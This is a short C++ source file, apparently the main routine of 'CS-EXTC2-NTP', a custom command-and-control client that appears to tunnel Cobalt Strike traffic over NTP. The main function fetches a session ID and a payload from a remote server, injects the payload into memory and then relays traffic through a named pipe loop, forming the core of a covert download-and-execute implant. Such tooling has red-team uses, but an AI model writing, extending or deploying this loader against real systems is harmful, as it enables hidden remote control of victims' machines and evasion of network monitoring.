/*

CS-EXTC2-NTP

*/
#include <iostream>
#include "createntp.hpp"
#include "parsentp.hpp"
#include "ntp.hpp"
#include "constants.hpp"
#include "helpers.hpp"
#include "net.hpp"
#include <vector>
#include "injector.hpp"
#include "pipe.hpp"

int main() {

	std::cout << "[>] Started" << std::endl;

	//0. Get Session ID from server
	std::vector<uint8_t> clientId = getId();

	//1. Get Payload
	std::cout << "[>] Getting Payload" << std::endl;
	std::vector<uint8_t> payloadBytes = getPayload(clientId);

	//2. run payload
	std::cout << "[>] Injecting Payload" << std::endl;
	injector(payloadBytes);

	//3. read from pipe & start with chunk loop
	std::cout << "[>] Pipe Loop Started" << std::endl;

	pipeLoop(clientId);

	std::cout << "[+] Finished!" << std::endl;
}